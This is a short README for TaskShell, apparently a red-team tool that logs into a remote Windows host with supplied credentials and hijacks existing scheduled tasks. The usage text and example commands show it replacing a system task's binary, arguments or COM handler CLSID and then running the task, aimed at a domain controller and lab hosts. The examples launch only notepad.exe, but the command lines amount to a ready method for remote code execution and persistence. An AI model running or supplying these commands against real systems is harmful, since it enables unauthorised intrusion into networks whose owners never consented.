# TaskShell

## Usage

```

  -h, --Host         Required. The remote host

  -u, --Username     The remote host

  -p, --Password     The password

  -d, --Domain       The remote domain

  -t, --Task         Fetch info of a specific task

  -b, --Binary       The binary to tamper the scheduled task with

  -a, --arguments    Additional command line arguments for the task

  -r, --Run          Run the task after modifying it

  -s, --Search       Search for a specific task

  -c, --Clsid        The CLSID to use as a COM handler

  --help             Display this help screen.

  --version          Display version information.
```

## Examples

```
TaskShell.exe -h DC01

TaskShell.exe -h DC01 -u Administraor -p Password1 -d domain.com 

TaskShell.exe -h DC01 -s "OneDrive"

TaskShell.exe -h DC01 -s "SYSTEM"

TaskShell.exe -h DC01 -s "Users"

TaskShell.exe -h 172.16.119.140 -u administrator -p 1qazxsw2.. -d isengard.local  -t "\Microsoft\Windows\Disk
Diagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"

TaskShell.exe -h 172.16.119.140 -u administrator -p 1qazxsw2.. -d isengard.local  -t "\Microsoft\Windows\Disk
Diagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" -b notepad.exe -r

TaskShell.exe -h 172.16.119.140 -u administrator -p 1qazxsw2.. -d isengard.local  -t "\Microsoft\Windows\Mobi
le Broadband Accounts\MNO Metadata Parser" -b cmd.exe -a "/C notepad.exe" -r

TaskShell.exe -h 172.16.119.140 -u administrator -p 1qazxsw2.. -d isengard.local  -t "\Microsoft\Windows\Disk
Diagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" -c "75DFF2B7-6936-4C06-A8BB-676A7B00B24B"  -r

```